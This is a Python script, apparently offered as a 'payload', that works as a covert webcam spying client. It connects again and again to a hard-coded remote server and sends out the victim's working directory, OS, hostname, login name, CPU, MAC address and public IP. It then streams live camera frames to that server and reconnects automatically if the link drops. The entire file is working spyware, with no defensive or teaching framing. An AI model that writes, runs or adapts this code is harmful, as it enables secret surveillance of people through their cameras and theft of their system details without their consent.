"""
   ▄▄▄▄▄   ████▄ █  █▀  ▄      ▄▄▄▄▄    ▄  █ ▄█ 
  █     ▀▄ █   █ █▄█     █    █     ▀▄ █   █ ██ 
▄  ▀▀▀▀▄   █   █ █▀▄  █   █ ▄  ▀▀▀▀▄   ██▀▀█ ██ 
 ▀▄▄▄▄▀    ▀████ █  █ █   █  ▀▄▄▄▄▀    █   █ ▐█ 
                   █  █▄ ▄█               █   ▐ (payload)
                  ▀    ▀▀▀               ▀      
                                ~ A1SBERG
"""

import socket, os, platform, cv2, threading, requests, time
from scapy.all import get_if_hwaddr, conf

def connect_to_server():
    """Establish a connection to the server."""
    while True:
        try:
            sock = socket.socket()
            sock.connect(("192.168.43.26", 8080))
            print("Connected to server.")
            return sock
        except Exception as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

def send_data(sock, data):
    """Send data to the server with a 4-byte length prefix."""
    try:
        encoded = data.encode('utf-8')
        sock.sendall(len(encoded).to_bytes(4, 'little') + encoded)
    except UnicodeEncodeError as e:
        print(f"Encoding error: {e}")
        sock.close()
        raise

def get_public_ip():
    """Retrieve the public IP address using an external service."""
    try:
        return requests.get('https://api.ipify.org').text.strip()
    except requests.RequestException as e:
        print(f"Error retrieving public IP: {e}")
        return "N/A"

def capture_video(sock):
    """Capture video from the default camera and stream it to the server."""
    cam = cv2.VideoCapture(0)
    while True:
        try:
            if not cam.isOpened():
                cam.open(0)
            ret, frame = cam.read()
            if not ret:
                print("Failed to grab frame.")
                continue
            _, enc = cv2.imencode('.jpg', frame)
            data = enc.tobytes()
            sock.sendall(len(data).to_bytes(4, 'little') + data)
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError) as e:
            print(f"Connection lost: {e}. Reconnecting...")
            cam.release()
            sock.close()
            handle_connection()
            cam = cv2.VideoCapture(0)
        except Exception as e:
            print(f"Unexpected error: {e}")
            cam.release()
            sock.close()
            # Optionally reconnect or break
            break
    cam.release()

def handle_connection():
    """Handle connection, sending system info and starting video capture."""
    sock = connect_to_server()
    # Send essential system info to the server
    try:
        send_data(sock, os.getcwd())                     # Current working directory
        send_data(sock, platform.system())               # OS name
        send_data(sock, socket.gethostname())            # Hostname
        send_data(sock, os.getlogin())                   # User login name
        send_data(sock, platform.processor())            # CPU info
        send_data(sock, platform.architecture()[0])      # System architecture
        send_data(sock, get_if_hwaddr(conf.iface))       # MAC address
        send_data(sock, get_public_ip())                 # External IP address
    except Exception as e:
        print(f"Error sending data: {e}")
        sock.close()
        return
    # Start video capture in a separate thread
    video_thread = threading.Thread(target=capture_video, args=(sock,))
    video_thread.start()
    # Monitor the connection
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Interrupted by user.")
    finally:
        sock.close()
        video_thread.join()

def main():
    while True:
        try:
            handle_connection()
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError) as e:
            print(f"Connection error: {e}. Reconnecting...")
        except Exception as e:
            print(f"Unexpected error in main loop: {e}")
        time.sleep(5)

if __name__ == "__main__":
    main()

